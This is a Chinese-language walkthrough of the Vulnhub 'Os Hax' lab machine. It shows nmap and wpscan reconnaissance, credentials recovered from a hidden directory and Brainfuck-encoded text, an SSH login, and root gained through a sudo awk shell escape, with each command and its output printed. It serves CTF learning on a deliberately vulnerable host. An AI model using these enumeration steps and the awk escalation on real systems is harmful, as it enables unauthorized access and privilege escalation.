---
layout: post
title: "Os Hax walkthrough"
date: 2021-06-30
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP               |
| ------------- | ---------------- |
| 本机（Win10） | `192.168.36.234` |
| Kali          | `192.168.36.89`  |
| OS-Hax        | `192.168.36.98`  |

### 扫描端口和版本信息

`nmap -A 192.168.36.98`

```shell
┌──(root💀kali)-[~]
└─# nmap -A 192.168.36.98
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-30 05:11 UTC
Nmap scan report for localhost (192.168.36.98)
Host is up (0.016s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)
|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c (ECDSA)
|_  256 e6:3a:13:8a:77:84:be:08:57:d2:36:8a:18:c9:09:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Hacker_James
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

扫描结果显示靶机开启**22**、**80**端口，没什么注意的地方。接下来进行目录枚举，发现网站在路径*/wordpress/*下搭建的是**Wordpress** CMS，并且在*wpscan*工具扫描后发现一个用户：`web`

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.36.98/wordpress/ -e u
...
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:06 <====================================> (10 / 10) 100.00% Time: 00:00:06

[i] User(s) Identified:

[+] web
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

之后经过账户密码爆破无果后，最终在*/img*目录下发现一个可疑的图片文件：`flaghost.png`，并且图片显示内容是用户配置靶机*hosts*文件，没什么关键信息，不过在经过*strings*工具查看后得到一个字符串：`passw@45`。得到该字符串首先想到的就是账户密码，但使用`web:passw@45`账户名和密码不能登录后台或ssh服务，之后发现这是一个目录名🙄。

在*http://192.168.36.98/passw@45/*目录下得到一个*flag2.txt*文本文件，将内容经过[Brainfack](https://www.splitbrain.org/services/ook
)解码后得到账户名和密码：`web:Hacker@4514`

### Getshell

使用`web:Hacker@4514`账户名和密码登录到靶机ssh服务，并且发现可运行*/usr/bin/awk*脚本文件。

```shell
┌──(root💀kali)-[~]
└─# ssh web@192.168.36.98
web@192.168.36.98's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
...
$ id
uid=1001(web) gid=1000(uname-a) groups=1000(uname-a)
$ uname -a
Linux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU/Linux
$ sudo -l
Matching Defaults entries for web on jax:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on jax:
    (root) NOPASSWD: /usr/bin/awk
...
```

可在`web`的用户目录下得到第三个flag：

```shell
$ cat flag3.txt
   ______          ______          ____                 __
  / ____/____     /_  __/____     / __ \ ____   ____   / /_
 / / __ / __ \     / /  / __ \   / /_/ // __ \ / __ \ / __/
/ /_/ // /_/ /    / /  / /_/ /  / _, _// /_/ // /_/ // /_
\____/ \____/    /_/   \____/  /_/ |_| \____/ \____/ \__/


MD5-HASH : 40740735d446c27cd551f890030f7c75
```

### 提权

我们知道`web`账户可运行`/usr/bin/awk`脚本工具，那么可阅读[这篇](https://www.hacknos.com/awk-privilege-escalation/)文章进行`awk`提权，得到最后一个flag。

```shell
web@jax:~$ sudo awk 'BEGIN {system("/bin/sh")}'
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
flag3.txt
# cat flag3.txt
   ______          ______          ____                 __
  / ____/____     /_  __/____     / __ \ ____   ____   / /_
 / / __ / __ \     / /  / __ \   / /_/ // __ \ / __ \ / __/
/ /_/ // /_/ /    / /  / /_/ /  / _, _// /_/ // /_/ // /_
\____/ \____/    /_/   \____/  /_/ |_| \____/ \____/ \__/


MD5-HASH : 40740735d446c27cd551f890030f7c75
```

### 总结

主要学到的内容就是对具备SUID权限`awk`工具进行提权，执行命令是：`sudo awk 'BEGIN {system("/bin/sh")}'`